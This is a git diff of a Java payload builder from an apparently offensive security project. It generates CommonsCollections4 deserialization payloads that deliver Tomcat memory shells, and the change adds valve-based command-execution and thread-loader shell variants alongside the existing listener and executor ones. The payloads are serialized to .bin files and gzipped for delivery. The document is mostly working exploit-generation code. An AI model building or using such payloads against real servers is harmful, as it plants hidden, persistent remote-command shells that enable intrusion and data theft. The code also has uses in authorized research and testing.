@@ -3,14 +3,15 @@ package com.demo.utils;
 import com.demo.echo.TomcatEcho;
 import com.demo.memshell.exec.TomcatListenerJMXMS;
 import com.demo.memshell.exec.TomcatListenerThreadMS;
+import com.demo.memshell.exec.executor.TomcatExecutorExecMS;
 import com.demo.memshell.exec.executor.TomcatExecutorThreadLoader;
-import com.demo.memshell.test.ThreadLoader;
+import com.demo.memshell.exec.valve.TomcatValueExecMS;
+import com.demo.memshell.exec.valve.TomcatValueThreadLoader;
 import me.gv7.tools.josearcher.entity.Blacklist;
 import me.gv7.tools.josearcher.entity.Keyword;
 import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
 import org.ppp.tools.ser.CC4Generator;
 import org.ppp.tools.ser.GZIPMaker;
-
 
 import java.util.ArrayList;
 import java.util.List;
@@ -51,18 +52,15 @@ public class PayloadMake {
         payload = cc4Generator.make(msmClass);
         System.out.println(payload.length());
         cc4Generator.makeFile(msmClass, String.format("dev/%s.bin", msmClass.getSimpleName()));
-        GZIPMaker.gzipMaker("com.demo.memshell.exec.executor.ExecutorExecMS");
+        GZIPMaker.gzipMaker(TomcatExecutorExecMS.class.getName());
 
-
-        // test
-//        msmClass = ThreadLoader.class;
-//        System.out.println(msmClass.getName());
-//        cc4Generator = new CC4Generator();
-//        payload = cc4Generator.make(msmClass);
-//        System.out.println(payload.length());
-//        cc4Generator.makeFile(msmClass, "dev/test.bin");
-//        GZIPMaker.gzipMaker("com.demo.memshell.test.ExecutorExecMS");
-
+        msmClass = TomcatValueThreadLoader.class;
+        System.out.println(msmClass.getName());
+        cc4Generator = new CC4Generator();
+        payload = cc4Generator.make(msmClass);
+        System.out.println(payload.length());
+        cc4Generator.makeFile(msmClass, String.format("dev/%s.bin", msmClass.getSimpleName()));
+        GZIPMaker.gzipMaker(TomcatValueExecMS.class.getName());
     }
 
     public void searchTomcat() {
